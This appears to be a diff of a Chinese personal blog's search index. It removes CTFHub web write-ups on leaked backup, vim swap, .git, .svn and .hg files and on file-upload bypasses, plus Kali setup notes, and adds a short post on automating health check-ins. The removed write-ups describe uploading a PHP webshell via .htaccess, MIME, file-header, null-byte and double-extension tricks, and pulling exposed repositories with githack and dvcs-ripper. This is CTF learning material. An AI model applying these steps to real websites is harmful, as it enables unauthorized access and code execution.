@@ -1,250 +1,25 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>ctfhub信息泄露</title>
-    <url>/2021/04/17/ctfhub%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2wp/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctfhub web之信息泄露</p>
+    <title>⛏事情真开心</title>
+    <url>/2021/08/09/%E2%9B%8F%E4%BA%8B%E6%83%85/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>🐋在⛏🔨事情</p>
 <span id="more"></span>
 
-<h4 id="目录遍历与PHPINFO"><a href="#目录遍历与PHPINFO" class="headerlink" title="目录遍历与PHPINFO"></a>目录遍历与PHPINFO</h4><p>0难度</p>
-<h5 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h5><p>依次打开文件夹即可，共16种可能，flag为随机出现</p>
-<p>属于签到题</p>
-<h5 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h5><p>页面内查找关键字”ctfhub”get flag </p>
-<h4 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h4><h5 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h5><p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%811.png?versionId=CAEQDhiBgIDF5vaLxxciIDBjZmZkNDQ5ZGUxOTRkMjBhYzAwNjFjNTdlMTViMGVi"></p>
-<p>dirsearch扫描</p>
-<p>命令如下（windows环境）：</p>
-<p>python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php</p>
-<p>扫描结果</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%813.png?versionId=CAEQDhiBgICCnPqnxxciIDI5MmE3OGY5M2JmMTRhODc5OTM3ZjFkMWYwODI1YTQz"></p>
-<p>网址+<a href="http://www.zip下载三个文件/">www.zip下载三个文件</a></p>
-<p>最终网站访问获得flag</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81.png?versionId=CAEQDhiBgMCGnPqnxxciIDYwYjcxYjhiNTk3OTQzYjk4OWVhNzc0MDIxNzBlNTVj"></p>
-<h5 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h5><p>dirsearch扫描</p>
-<p>获取三个文件</p>
-<p><strong>/index.php</strong></p>
-<p><strong>/index.php.bak</strong></p>
-<p><strong>/index.php/llogin/</strong></p>
-<p>浏览器网址+/index.php.bak打开</p>
-<p>下载完成后打开获取flag</p>
-<h5 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h5><p>kali下进行</p>
-<p>终端：</p>
-<ol>
-<li>wget <a href="http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.index.php.swp">http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.index.php.swp</a></li>
-<li>cat .index.php.swp</li>
-</ol>
-<p>获取flag</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/vim%E7%BC%93%E5%AD%982.png?versionId=CAEQDhiBgIC2uI6oxxciIGMxNDMwNTY4MDMyYTQ5YTZhMzIxYzBkODFlOTRlMDdh"></p>
-<h5 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h5><p>同vim缓存</p>
-<p>kali下进行</p>
-<p>终端：</p>
-<ol>
-<li>wget <a href="http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.DS_Store">http://challenge-0179187a5798aa64.sandbox.ctfhub.com:10080/.DS_Store</a></li>
-<li>cat .index.php.swp</li>
-</ol>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.DS_Store1.png?versionId=CAEQDhiBgICFipSoxxciIDhkZGE4Zjc4MzEzYzRmZDA5M2IwZGE0NzY5NjNmY2Vi"></p>
-<p>浏览器访问：</p>
-<p>网址/cf4390cd5ee7e79529e10649859bd647.txt</p>
-<p>获取flag</p>
-<h4 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h4><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
-<h5 id="log"><a href="#log" class="headerlink" title="log"></a>log</h5><h6 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h6><p>githack官网上下载下来的是python2版本，如今大多数用的都是python3，所以还需下载一个python2。``</p>
-<p>cmd中输入python所调用的脚本是环境变量中前面的那一个，如果每一次切换版本还需要更改环境变量也太麻烦了，所以可以使用命令来切换。</p>
-<p> <strong>py -2调用python2，py -3调用的是python3</strong></p>
-<h6 id="开灶"><a href="#开灶" class="headerlink" title="开灶"></a>开灶</h6><p>githack clone 目标源代码到本地</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -2 http:&#x2F;&#x2F;challenge-070d7210e3108a89.sandbox.ctfhub.com_10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-
-<p>执行 <code>git log</code> 查看历史记录</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/log1.png?versionId=CAEQFRiBgIDci9X9yxciIDEzOWI4NDFiY2I2MjQ1ZmY5OWRmZmJjYTJlZWUwMWRj"></p>
-<p><code>git diff 9bd149...</code></p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/log3.png?versionId=CAEQFRiBgIC.i9X9yxciIGRlYWU4NDVmYjBhNDQyYmU4NjI0MTQxMDJkOGQ2NjQ0"></p>
-<h5 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h5><h6 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h6><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
-<p>通过git stash存储的修改列表,可以通过git stash list查看.git stash show用于校验,git stash apply用于重新存储.直接执行git stash等同于git stash save.</p>
-<p>最新的存储保存在refs/stash中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p>
-<h6 id="开灶-1"><a href="#开灶-1" class="headerlink" title="开灶"></a>开灶</h6><p>githack clone–&gt;git log</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/stash1.png?versionId=CAEQFRiBgIDCiIr.yxciIGQ5ZDk4YTFhYTM5ZTQ5ODliNzRhYjMyNGU5MmUxY2Nh"></p>
-<p>执行 git stash list 发现有 stash,然后git stash pop </p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/stash2.png?versionId=CAEQFRiBgMCMiIr.yxciIDFlMjk3ZTk5YzU5NjRmYjk5YmI2Mjk4NTJlNDI4MDYx"></p>
-<p>再次git diff 6458b52874b51846c2ca53a26b0add249369b532</p>
-<p>get flag</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/stash3.png?versionId=CAEQFRiBgMCqiIr.yxciIDliMmVjZGQ4YzQzNDQ2OTE4ZjkyMTM0OGYyMzJjMThk"></p>
-<h5 id="index"><a href="#index" class="headerlink" title="index"></a>index</h5><p>因为实在太混所以一直对着wp写的，尝试自己做一题，结果githack clone下来后就打开文件夹就最直接存在<strong>flag.txt</strong>。</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/index1.png?versionId=CAEQFRiBgID31IOKzBciIDNlMmMyNDFmYzM0ODRlZGJiZDU1YjEyZGU1ZDYwMGI4"></p>
-<h4 id="SVN泄露与HG泄露"><a href="#SVN泄露与HG泄露" class="headerlink" title="SVN泄露与HG泄露"></a>SVN泄露与HG泄露</h4><h5 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h5><h6 id="写在前面-1"><a href="#写在前面-1" class="headerlink" title="写在前面"></a>写在前面</h6><p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
-<h6 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h6><p>dvcs-ripper中的rip-svn.pl clone下来</p>
-<p>前期因为命令错误一直导致clone失败，正确命令：</p>
-<p><code>perl rip-svn.pl -v -u http://120.132.56.20:1515/.svn/</code></p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.svn1.png?versionId=CAEQFhiBgICkofPkzBciIDA5MmQ3ZDUwNDQyNDRkNGU5NWYwZmExMDZlYWRjOGY2"></p>
-<p><code>tree .svn</code></p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.svn2.png?versionId=CAEQFhiBgMDhofPkzBciIDVlZTZkZDZlNDM4MzQzM2I5ZGZmM2Q4ZGMyOTY1NmMy"></p>
-<p><code>cd .svn/pristine/</code></p>
-<p><code>cat 00/00c73b1c8ee0f1d111180fb329e39c7f8dce7900.svn-base</code></p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/.svn3.png?versionId=CAEQFhiBgMClofPkzBciIGJmNWFjZmZjMjI0MTQyMzdiNjlhMjIzYTNmZWY3MjNl"></p>
-<p>get  flag</p>
-<h5 id="hg泄露"><a href="#hg泄露" class="headerlink" title="hg泄露"></a>hg泄露</h5><h6 id="写在前面-2"><a href="#写在前面-2" class="headerlink" title="写在前面"></a>写在前面</h6><p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
-<h6 id="开灶-2"><a href="#开灶-2" class="headerlink" title="开灶"></a>开灶</h6><p>使用 <code>dvcs-ripper</code> 工具中的 <code>rip-hg.pl</code> 脚本进行 clone。</p>
-<p>发现直接执行 hg status 出错，工具 clone 的时候并没有 clone 完整，再次证明不能过分相信工具不要过分迷信工具。</p>
-<p>查看<code>.hg/store/fncache</code></p>
-<p>可知flag文件名为<code>flag_2592426997.txt</code></p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/hg1.png?versionId=CAEQFRiBgICQ5b6SzBciIDg1NDhjMGI5OTVhNjRlMDBiMTMwMTYyZGFlYzdjMWYy"></p>
-<p>浏览器直接访问获得flag</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/hg2.png?versionId=CAEQFRiBgMD35L6SzBciIDc4YThjNTg3YTRkODQ1Mzk5ZDAxOWNjMmFjNWU0M2E4"></p>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>ctfhub信息泄露就此上传完毕</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.png?versionId=CAEQFhiBgID7hfzkzBciIDI3NzVjYzJiNTk0ODRiZTA4YjM1NmZkMWI3NTAwOGFl"></p>
-<p>学艺不精所以题目都是看着wp完成的，有很多疑问来不及解决，留下了许多空白，需要不断学习来回头补充。</p>
+<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>前两天在B站看到一个视频，提到做up主的动力是什么，up的回答是他每隔一段时间都会做几个水视频，这样可以一直保持兴趣，不至于做这一类太无聊。学习确实过于枯燥，如何让自己一直保持兴趣，我觉得偶尔花花时间玩玩黑科技，也是一个不错的选择。既能提升自己的兴趣，保持学习动力，又能学到东西（其实就是装X）。话不多说，直接开🐛</p>
+<h1 id="企业微信健康打卡"><a href="#企业微信健康打卡" class="headerlink" title="企业微信健康打卡"></a>企业微信健康打卡</h1><p><strong>前言</strong></p>
+<p>主要是来自Elli0t的博客，非常感兴趣，也想自己复现一下。并且在询问他本人之后，加入了他的Github项目。</p>
+<p>先附上他的博客链接：</p>
+<p><a href="https://spacey.top/2020/07/12/%E8%87%AA%E5%8A%A8%E5%81%A5%E5%BA%B7%E6%89%93%E5%8D%A1%EF%BD%9CFUCK-jiankangdaka/">https://spacey.top/2020/07/12/%E8%87%AA%E5%8A%A8%E5%81%A5%E5%BA%B7%E6%89%93%E5%8D%A1%EF%BD%9CFUCK-jiankangdaka/</a></p>
+<p>这个人有点不太文明👀，项目的名字都带是₣uck</p>
+<p><strong>复现</strong></p>
+<p>最初我以为这个项目已经很完善了，只要修改一下我的数据就OK了。但现在一看，毕竟是去年暑假的项目，部分填报数据有所改变，需要自己再修改一下。更难受的是自己的编程能力，七百行的代码看起来真的有点崩溃。</p>
 ]]></content>
       <categories>
-        <category>web</category>
+        <category>interest</category>
       </categories>
       <tags>
-        <tag>信息泄露</tag>
-        <tag>write up</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfhub文件上传</title>
-    <url>/2021/04/15/ctfhub%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wp/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ctfhub web之文件上传</p>
-<span id="more"></span>
-
-<h4 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h4><p>编写一句话木马并上传<br><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC.png?versionId=CAEQDhiBgIDlw6TgxhciIDZkODI4ZmVkNzJhYjQxMjBiN2JkYjIzODM3OTc0OWE0"></p>
-<p>获取相对路径</p>
-<p>upload/shell.php</p>
-<p>打开中国蚁剑上传</p>
-<p>右键–&gt;添加数据–&gt;网址+相对路径–&gt;打开flag.php</p>
-<p>获取flag</p>
-<h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><p>右键查看源码，发现该网站只支持”jpg”、”png”、”gif”,所以将一句话木马后缀名添加”.jpg”上传</p>
-<p>burp suite抓包–&gt;将一句话木马后缀名恢复成”.php”，放包</p>
-<p>上蚁剑。</p>
-<h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><h5 id="htaccess是什么？"><a href="#htaccess是什么？" class="headerlink" title=".htaccess是什么？"></a>.htaccess是什么？</h5><p> .htaccess叫分布式配置文件，全称是Hypertext Access(超文本入口),它提供了针对目录改变配置的方法——在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。并且子目录中的指令会覆盖更高级目录或者主服务器配置文件中的指令。</p>
-<p>作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。.htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的。.htaccess可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档、文件的跳转等功能。</p>
-<h5 id="htaccess-文件上传漏洞原理："><a href="#htaccess-文件上传漏洞原理：" class="headerlink" title=".htaccess 文件上传漏洞原理："></a>.htaccess 文件上传漏洞原理：</h5><p>一般.htaccess可以用来留后门和针对黑名单绕过</p>
-<p>创建一个txt写入：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
-
-<p>把”jpg”文件当作”php”文件解析</p>
-<p>重命名为”.htaccess”</p>
-<p>另一种做法：封装：<br>&lt;FilesMatch “1”&gt;<br>SetHandler application/x-httpd-php<br><br>此方法将名为”1”的文件解析为”php”</p>
-<h5 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h5><p>上传”.htaccess”文件，提交</p>
-<p>目的是替换原有的”.htaccess”文件</p>
-<p>上传”一句话木马.jpg”，提交</p>
-<p>上蚁剑。</p>
-<h4 id="MEMI绕过"><a href="#MEMI绕过" class="headerlink" title="MEMI绕过"></a>MEMI绕过</h4><h5 id="什么是MEMI"><a href="#什么是MEMI" class="headerlink" title="什么是MEMI"></a>什么是MEMI</h5><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p>
-<h5 id="MEMI绕过的原理"><a href="#MEMI绕过的原理" class="headerlink" title="MEMI绕过的原理"></a>MEMI绕过的原理</h5><p>部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。</p>
-<h5 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h5><p>text/plain（纯文本）<br>text/html（HTML文档）<br>text/javascript（js代码）<br>application/xhtml+xml（XHTML文档）<br>image/gif（GIF图像）<br>image/jpeg（JPEG图像）<br>image/png（PNG图像）<br>video/mpeg（MPEG动画）<br>application/octet-stream（二进制数据）<br>application/pdf（PDF文档）</p>
-<h5 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h5><p>上传”一句话木马.php”,Burp Suit抓包</p>
-<p>raw栏，修改Conte-Type: application/octet-stream为</p>
-<p>Conte-Type: image/png</p>
-<p>放包</p>
-<p>上蚁剑。</p>
-<h4 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h4><p>提交”一句话木马.php”文件后报错，返回为只允许”jpeg,jpg,png,gif”类型文件</p>
-<p>上传”一句话木马.php”，Burp Suite抓包；</p>
-<p>修改Content-Type: image/gif</p>
-<p>给一句话木马前添加”gif”文件的文件头，”GIF89a”,放包；</p>
-<p>上蚁剑。</p>
-<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>先上个图</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD1.png?versionId=CAEQDhiBgID3vcP3xhciIGVlYmM3NzYzNzgzNjQ1M2Q5ZGI3ZWU0NTAzOTAzMDE4"></p>
-<h5 id="什么是00截断"><a href="#什么是00截断" class="headerlink" title="什么是00截断"></a>什么是00截断</h5><p>00截断的原理，就是利用0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。</p>
-<p>需要注意的是，0x00截断是16进制的截断，需要修改16进制的数据头，如果使用burp，就要在Hex中对数据进行改写。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00截断的限制条件是PHP&lt;5.3.29，且GPC关闭，一般在url上</span><br></pre></td></tr></table></figure>
-
-<p>在url中 %00 表示ascll码中的 0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</p>
-<h5 id="表达方式"><a href="#表达方式" class="headerlink" title="表达方式"></a>表达方式</h5><p>0x00 ， %00 ， /00 </p>
-<h5 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h5><p>上传”一句话木马.php%00.jpg”时，后台读取到”一句话木马.php”就停止了。</p>
-<h5 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h5><p>上传一句话”1.php”，BP抓包</p>
-<p>修改如下</p>
-<ol>
-<li>Post添加1.php%00</li>
-<li>filename修改为”1.jpg”</li>
-</ol>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD2.png?versionId=CAEQDhiBgMD2k77.xhciIGRjNThlNDE0Yjc1MDQ4NGFiMzAzNjJkNzRjMzIwMTI1"></p>
-<p>放包</p>
-<p>上蚁剑？</p>
-<p>踩坑预警</p>
-<p><a href="http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/?road=/var/www/html/upload/1.php">http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/?road=/var/www/html/upload/1.php</a></p>
-<p>错误演示</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD4.png?versionId=CAEQDhiBgMCArsz.xhciIGU4ZjRhNzI1OWFkZDQ5MjdhMWRlMTkxOTc2MTZhMjhi"></p>
-<p>将”?road=/var/www/html”删除，直接访问</p>
-<p><a href="http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/upload/1.php">http://challenge-e119f2f1e564a7be.sandbox.ctfhub.com:10080/upload/1.php</a></p>
-<p>正确连法</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/00%E6%88%AA%E6%96%AD3.png?versionId=CAEQDhiBgMDrk77.xhciIDkxOGRjOTJlZjA5NjRkYWNhZThhMTkwMDQ0YmY4YjBk"></p>
-<p>粘贴一段原话</p>
-<p><em><u>“action=?road=var/www/html/upload/“和$des = $_GET[‘road’] . “/“ . rand(10, 99) . date(“YmdHis”) . “.” . $ext;这段代码的意思是将上传的文件放在upload文件夹中，而直接访问?road=var/www/html/upload/会再次调用代码（本来会报错，但@和服务器端都抑制了报错），所以只需要访问/upload/1.php就可以了</u></em></p>
-<p>连接成功，获取flag！</p>
-<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>打开靶机上传一句话成功后发现并不是我们想要的结果</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%871.png?versionId=CAEQDhiBgMC4_IH_xhciIDU0Y2EwNTc2ZjRlZjQ1ZGM5MTQ5MTcyZGVmOTU3ZmQ0"></p>
-<p>根据提示使用双写绕过：</p>
-<p>BP抓包；</p>
-<p>将文件后缀名修改为”pphphp”；</p>
-<p>放包；</p>
-<p>上蚁剑。</p>
-<p>至此文件上传告一段落</p>
-<p><img src="https://wha1e-bucket.oss-cn-beijing.aliyuncs.com/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.png?versionId=CAEQDhiBgIDqj4f_xhciIGIxZWYxZmZhMGY1NjQ0ZWRhOTc5ODUxYTljYjE2NTZk"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>write up</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>First</title>
-    <url>/2021/03/27/first/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>搭建博客成功！<br> <span id="more"></span><br>  此次搭建博客的历程，由于对命令的不理解导致饶了许多弯路。<br>搭建博客的目的是为了更好的学习，今后也一定要不忘初心，多逛逛大佬的博客，常更新自己的博客。</p>
-<p>最后在此鸣谢电子马同学的大力支持。<br>附上搭建博客教程：<a href="https://zhuanlan.zhihu.com/p/102592286">https://zhuanlan.zhihu.com/p/102592286</a></p>
-]]></content>
-      <categories>
-        <category>dailylife</category>
-      </categories>
-      <tags>
-        <tag>daily</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali_misc工具</title>
-    <url>/2021/07/10/kali_misc%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>kali上有太多好用的工具了，这里介绍如何在上面安装misc工具</p>
-<span id="more"></span>
-
-<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><strong>kali</strong> 安装好之后，我们需要对里面的工具进行升级。为了可以顺利安装工具，我们应该先进行换源。</p>
-<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>1.<code>sudo vim /etc/apt/sources.list</code></p>
-<p>2.<code>a</code></p>
-<p>3.在后面添加源，将原有源注释掉；</p>
-<p>4.esc退出</p>
-<p>5.<code>:wq</code>保存</p>
-<h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>1.安装文本编辑器：sudo apt-get install leafpad</p>
-<p>2.用文本编辑器打开文件：leafpad /etc/apt/sources.list</p>
-<p>3.在后面添加源，将原有源注释掉；</p>
-<p>4.退出保存</p>
-<h3 id="一些国内源"><a href="#一些国内源" class="headerlink" title="一些国内源"></a>一些国内源</h3><p>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>#阿里云<br>deb <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.aliyun.com/kali">http://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib<br>#清华大学<br>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/kali">https://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main contrib non-free<br>#163<br>deb <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy main non-free contrib<br>deb-src <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy main non-free contrib<br>deb <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy-proposed-updates main non-free contrib<br>deb-src <a href="http://mirrors.163.com/debian">http://mirrors.163.com/debian</a> wheezy-proposed-updates main non-free contrib<br>deb-src <a href="http://mirrors.163.com/debian-security">http://mirrors.163.com/debian-security</a> wheezy/updates main non-free contrib </p>
-<p>#浙大源</p>
-<p>deb <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
-<p>deb-src <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p>
-<p>#东软大学<br>deb <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>deb-src <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>#官方源<br>deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p>
-<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>1.先执行：<code>apt-get update</code></p>
-<p>2.再执行：<code>apt-get upgrade</code></p>
-<p>3.重启：<code>reboot</code></p>
-<p>时间可能会比较长，耐心等待就好了</p>
-<p>这样一来kali的基本配置就准备好了。可以开始安装工具了！</p>
-<h2 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h2><p>tree的功能是创建文件列表，然后将文件列表以树的形式列出来。这应该算是基本工具。</p>
-<p>安装：<code>sudo apt-get install tree</code></p>
-<p>tree的一些基本用法：</p>
-<p><code>-a 显示所有文件和目录。</code><br><code>-A 使用ASNI绘图字符显示树状图而非以ASCII字符组合。</code><br><code>-C 在文件和目录清单加上色彩，便于区分各种类型。</code><br><code>-d 显示目录名称而非内容。</code><br><code>-D 列出文件或目录的更改时间。</code><br><code>-f 在每个文件或目录之前，显示完整的相对路径名称。</code><br><code>-F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上&quot;*&quot;,&quot;/&quot;,&quot;=&quot;,&quot;@&quot;,&quot;|&quot;号。</code><br><code>-g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。</code><br><code>-i 不以阶梯状列出文件或目录名称。</code><br><code>-I 不显示符合范本样式的文件或目录名称。</code><br><code>-l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。</code><br><code>-n 不在文件和目录清单加上色彩。</code><br><code>-N 直接列出文件和目录名称，包括控制字符。</code><br><code>-p 列出权限标示。</code><br><code>-P 只显示符合范本样式的文件或目录名称。</code><br><code>-q 用&quot;?&quot;号取代控制字符，列出文件和目录名称。</code><br><code>-s 列出文件或目录大小。</code><br><code>-t 用文件和目录的更改时间排序。</code><br><code>-u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。</code><br><code>-x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外</code></p>
